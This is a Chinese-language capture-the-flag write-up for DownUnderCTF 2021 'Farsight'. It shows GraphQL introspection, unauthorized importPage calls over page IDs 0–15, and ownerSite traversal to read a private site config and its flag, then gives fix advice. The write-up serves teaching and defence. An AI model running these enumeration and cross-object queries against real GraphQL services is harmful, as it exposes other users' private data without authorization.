# DownUnderCTF 2021 - Farsight

## 题目简述

GraphQL 应用允许用户建立站点并导入已有页面。`importPage` 只校验目标站点属于当前用户，却不校验源页面是否可见；导入后，`Page.ownerSite` 又无条件返回页面原所属站点及其配置。把管理员页面引用到自己的站点，就能沿 GraphQL 对象关系跨越私有站点边界，读取配置中的 flag。

## 解题过程

### 用 introspection 恢复隐藏功能

前端没有完整暴露导入功能，但 GraphQL introspection 仍可查询 schema：

```graphql
query Introspect {
  __schema {
    types {
      name
      fields {
        name
        description
      }
    }
  }
}
```

返回结果中有三个标记为 beta 的关键成员：

```text
Mutation.importPage
Page.ownerSite
Page.siteRefs
```

schema 还说明 `Site.config` 会返回键值对。于是目标是先让私有页面出现在自己的 `Site.pages` 中，再通过该页面回溯原站点。

### 注册并取得自己的站点 ID

`loginOrRegister` 会在用户名不存在时同时创建用户和默认站点，并返回 JWT：

```graphql
mutation {
  loginOrRegister(username: "solve", password: "solve-password")
}
```

携带 `Authorization: Bearer TOKEN` 查询：

```graphql
query {
  me {
    id
    sites { id }
  }
}
```

记下自己的站点 ID。

### 越权导入页面

解析器只检查 `siteId` 的所有者：

```typescript
const siteOwner = await getSiteOwner(ctx.db, siteId);
if (siteOwner?.id !== ctx.user)
    throw new AuthenticationError("Forbidden");

return await importPage(ctx.db, pageId, siteId);
```

它既没有读取源页面的所属站点，也没有检查该站点的 `public` 标志。页面 ID 是从零开始的小整数，可把一段范围内的页面逐个导入到自己的站点：

```graphql
mutation Import($page: ID!, $site: ID!) {
  importPage(pageId: $page, siteId: $site)
}
```

官方数据中前 16 个用户各有站点，对页面 ID `0` 至 `15` 重复该请求即可覆盖管理员页面。

### 沿 `ownerSite` 读取私有配置

`getSitePages` 会同时返回站点自有页面和 `page_ref` 中引用的页面，而 `Page.ownerSite` 直接查询页面的原始站点，没有再次执行授权判断：

```graphql
query ReadOwners($site: ID!) {
  site(id: $site) {
    pages {
      id
      ownerSite {
        id
        name
        config { key value }
      }
    }
  }
}
```

在某个 `ownerSite.config` 中找到键 `flag`，其值为：

```text
DUCTF{5h0wINg_S3cREt_sch3m4S_spR1nGs_SITe_sUPeRVi5I0N_Sid3STeP-bdcf8179}
```

## 方法总结

本题是 GraphQL 对象级授权缺失。根查询对私有站点做了检查，并不代表后续 mutation 和字段解析器自动安全；`importPage` 与 `ownerSite` 的组合形成了跨对象引用链。修复时应在导入源页面、建立引用和解析原所属站点的每一步都校验当前用户是否有权查看该对象，并按生产策略关闭或限制 introspection。
